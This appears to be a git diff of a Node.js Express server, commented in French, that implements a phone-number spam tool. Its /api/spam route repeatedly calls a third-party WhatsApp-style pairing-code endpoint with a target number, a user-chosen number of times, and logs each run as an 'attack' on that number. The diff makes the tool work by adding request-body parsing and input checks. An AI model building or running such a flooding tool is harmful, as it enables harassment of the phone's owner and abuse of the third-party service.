@@ -3,16 +3,21 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// On sert les fichiers statiques
+// Configuration pour lire les données JSON envoyées depuis le formulaire
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// On sert les fichiers statiques (le HTML)
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Route API
 app.post('/api/spam', async (req, res) => {
-    const { number, count } = req.body;
-
-    if (!number || !count) {
+    // Vérification que les données existent bien
+    if (!req.body || !req.body.number || !req.body.count) {
         return res.status(400).json({ error: 'Numéro et nombre requis' });
     }
+
+    const { number, count } = req.body;
 
     console.log(`[${new Date().toISOString()}] Attaque lancée vers ${number} x${count}`);
 
@@ -23,7 +28,7 @@ app.post('/api/spam', async (req, res) => {
     try {
         for (let i = 0; i < count; i++) {
             try {
-                // Appel avec des headers spécifiques pour éviter le CORS
+                // Appel à l'API cible avec des en-têtes spécifiques
                 const response = await fetch(`https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=${encodeURIComponent(number)}`, {
                     method: 'GET',
                     headers: {
@@ -50,7 +55,7 @@ app.post('/api/spam', async (req, res) => {
                 failCount++;
             }
 
-            // Délai entre les envois
+            // Délai entre les envois pour ne pas surcharger le serveur cible
             if (i < count - 1) {
                 await new Promise(resolve => setTimeout(resolve, 800));
             }
